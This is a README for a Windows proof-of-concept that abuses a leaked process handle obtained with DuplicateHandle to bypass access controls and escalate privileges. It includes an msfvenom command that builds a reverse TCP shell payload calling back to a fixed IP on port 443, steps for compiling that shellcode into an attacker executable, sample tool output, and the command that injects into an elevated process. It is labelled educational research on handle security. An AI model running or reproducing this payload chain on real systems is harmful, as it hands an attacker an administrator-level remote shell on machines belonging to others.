# BypassDACL

PoC for Bypassing DACL in Windows using DuplicateHandle.

Read more about this code: [Security of Handles in Windows](https://glory-part-39d.notion.site/Security-of-Handles-in-Windows-caaa2531a0914ef0b7779ea366f69bcb).

This code demonstrates how to create a security hole in your program, potentially leading to privilege escalation.

**Note: This is a Proof of Concept (PoC) and is for educational purposes only.**

## Running the Code

### Generate Shellcode for AttackerPE.exe

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.148 LPORT=443 -f c -b \x00\x0a\x0d
```

Copy the generated shellcode into `AttackerSource.cpp` and compile it.

### Steps to Execute

1. Run `powershell.exe` with Admin privileges.
2. Run `notepad.exe` with normal user privileges.
3. Run `vendor.exe` with Admin privileges.

```sh
Vendor.exe
Enter the Process name that you want to get Handle (e.g., powershell.exe): powershell.exe
Enter the target Process name (e.g., notepad.exe): notepad.exe
[+] SeDebugPrivilege enabled successfully.
[+] PID of powershell.exe: 8420
[+] Handle of powershell.exe is OK
[*] Run Process Explorer and find handles of notepad.exe, then find a handle named powershell.exe
and write the address of the handle in AttackerPE code...
[*] Sleep(INFINITE). After running AttackerPE.exe, press Ctrl+C to exit.
```

4. Open **procexp64.exe** and copy the address of the handle (powershell.exe) from **notepad.exe**.
5. Run `AttackerPE.exe` with normal user privileges.

```sh
AttackerPE.exe <address> <process name>
AttackerPE.exe 0xFFFFB08D881EE080 notepad.exe
```
